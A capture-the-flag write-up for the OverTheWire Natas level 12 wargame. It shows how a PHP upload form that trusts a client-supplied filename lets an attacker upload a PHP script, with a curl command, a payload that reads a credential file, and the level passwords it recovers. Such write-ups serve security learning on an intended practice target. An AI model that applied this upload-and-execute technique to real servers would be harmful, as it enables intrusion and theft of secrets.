```php
<?
function genRandomString() {
	$length = 10;
	$characters = "0123456789abcdefghijklmnopqrstuvwxyz";
	$string = "";
	for ($p = 0; $p < $length; $p++) {
	    $string .= $characters[mt_rand(0, strlen($characters)-1)];
	}
	
	return $string;
}

function makeRandomPath($dir, $ext) {
	do {
		$path = $dir."/".genRandomString().".".$ext;
	} while(file_exists($path));
	return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
	$ext = pathinfo($fn, PATHINFO_EXTENSION);
	return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
	$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
	
	if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
		echo "File is too big";
	} else {
		if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
			echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
		} else{
			echo "There was an error uploading the file, please try again!";
		}
	}
} else {
?>
```

This level allows for image/file uploads. From the source code, we can see that a destination path will be generate:

```
/upload/<random string>.<extension>
```

`<random string>` will be random, but `<extension>` will be determined through `"filename"`. And the filename will be uploaded through a POST request

However, in the input field for the file:
```html
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
```

Meaning `<extension>` for this will always be jpg. So I used `curl` to set the filename and the `uploadedfile` because `uploadedfile` will be the one that gets worked with.

I also created an `image.php` containing `<?php phpinfo(); ?>`. I wanted to test out if uploading a script file would work.

```sh
curl -u natas12:YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG  -F "filename=test.php" -F "uploadedfile=@./test.php" http://natas12.natas.labs.overthewire.org
```

This gave me this:
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/swhfe2r5l5.php">upload/swhfe2r5l5.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

We can see that the file is now uploaded to `upload/swhfe2r5l5.php` so if we go to `http://natas12.natas.labs.overthewire.org/upload/swhfe2r5l5.php`, we will see our script, which shows a `phpinfo()` page.

So we confirmed that uploading scripts works. Let's write a script that allows us to read the password of natas13:
```php
<?php
$password = file_get_contents("/etc/natas_webpass/natas13");
echo $password;
?>
```

When I run this script using the same curl command, I got this:
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
The file <a href="upload/96yvfu2czv.php">upload/96yvfu2czv.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

When I go to `upload/96yvfu2czv.php`, I got this:
```
lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
```
